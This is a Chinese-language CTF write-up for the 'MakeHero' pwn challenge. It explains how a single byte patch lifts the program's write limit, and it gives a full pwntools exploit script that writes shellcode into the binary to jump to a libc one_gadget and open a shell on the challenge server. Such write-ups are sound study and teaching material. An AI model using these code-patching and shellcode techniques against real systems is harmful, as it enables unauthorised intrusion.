#### 思路

经过测试，可以修改任意属性地址的内容（包括代码段）,但是限制次数，所以先使用一次来修改elf，使得可以使得修改程序次数不受限制，具体在

```
.text:000000000000186F 8B 85 74 FF FF FF             mov     eax, [rbp+var_8C]
.text:0000000000001875 8D 50 FF                      lea     edx, [rax-1]
.text:0000000000001878 89 95 74 FF FF FF             mov     [rbp+var_8C], edx
.text:000000000000187E 85 C0                         test    eax, eax
.text:0000000000001880 0F 85 E2 FE FF FF             jnz     loc_1768
```

`0x1878`处将其改为 `mov     [rbp+var_8C], eax` ，即将 `0x1879`处的95改为85

然后就可以修改elf，且只能修改elf

找一段可触发的用作shellcode的地址，即scanf读取失败的地址，填充shellcode，scanf输入错误时就getshell

```
.text:00000000000017B5 48 8D 05 4C 0A 00 00          lea     rax, byte_2208
.text:00000000000017BC 48 89 C7                      mov     rdi, rax                        ; s
.text:00000000000017BF E8 AC F9 FF FF                call    _puts
.text:00000000000017BF
.text:00000000000017C4 48 8D 05 68 0A 00 00          lea     rax, byte_2233
.text:00000000000017CB 48 89 C7                      mov     rdi, rax                        ; s
.text:00000000000017CE E8 9D F9 FF FF                call    _puts
.text:00000000000017CE
.text:00000000000017D3 BF FF FF FF FF                mov     edi, 0FFFFFFFFh                 ; status
.text:00000000000017D8 E8 83 FA FF FF                call    _exit
.text:00000000000017D8
.text:00000000000017DD                               ; ---------------------------------------------------------------------------
```

#### exp

```
from pwn import *
import re

context(log_level='debug', arch='amd64', os='linux')

# io = process('/home/kali/pwn/newstar2024/week4/MakeHero')
# io = gdb.debug('/home/kali/pwn/newstar2024/week4/MakeHero')
io = remote('39.106.48.123',30555)

pattern = r'0x[0-9a-fA-F]+'
list = []

str = io.recv().decode(encoding="utf-8")
str += io.recv().decode(encoding="utf-8")


list = re.findall(pattern, str)

print(list)
p_base = int(list[0], 16)
libc_text_base = int(list[2], 16)

io.sendline(b'd31imiter')

firpayload = hex(p_base + 0x1879)[2::].encode(encoding='utf-8') + b' ' + rb'85'

print(firpayload)
io.sendlineafter(b'd31imiter', firpayload)

one_gadget = 0xebc88 + libc_text_base - 0x28000

tar_addr = p_base + 0x17B5

shellcode = b'\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xB8' + p64(one_gadget) + b'\xFF\xE0' +b'\x90\x90\x90'


add = tar_addr
for i in range(len(shellcode)):
    io.sendlineafter(b'\x0a\x0a\xe4\xbd\xa0\xe5\xa4\xa7', hex(add).encode(encoding='utf-8')[2::] + b' ' + hex(shellcode[i])[2::].encode(encoding='utf-8'))
    add+=1


io.interactive()

```

shellcode为将rsi，rdx清零，跳转到one_gadget
